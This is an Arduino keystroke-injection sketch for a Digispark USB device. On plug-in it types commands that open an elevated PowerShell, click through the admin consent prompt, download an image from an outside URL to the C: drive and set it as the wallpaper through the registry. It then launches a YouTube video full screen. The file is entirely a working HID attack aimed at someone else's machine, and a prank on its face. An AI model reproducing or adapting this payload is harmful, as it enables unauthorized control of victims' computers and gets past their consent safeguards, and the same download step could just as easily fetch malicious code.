#include "DigiKeyboard.h"

void setup() {

}

void loop() {
  // put your main code here, to run repeatedly:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  DigiKeyboard.print("Invoke-WebRequest -Uri \"https://pbs.twimg.com/media/FZ1R4aeX0AABJwk.jpg\" -OutFile \"C:\\photo.png\"");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("Function Set-WallPaper($Value)\n {\n  Set-ItemProperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value $value; \n rundll32.exe user32.dll, UpdatePerUserSystemParameters; \n }");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  SetPhotoToDesktop();
  
  ExitShell();
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("https://www.youtube.com/watch?v=hQagzXbyp9I");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F11);
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_F);

  for (;;) {}
}

void SetPhotoToDesktop()
{
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set-WallPaper -value \"c:\\photo.png\"");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
}

void ExitShell()
{
  DigiKeyboard.print("exit");
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
}
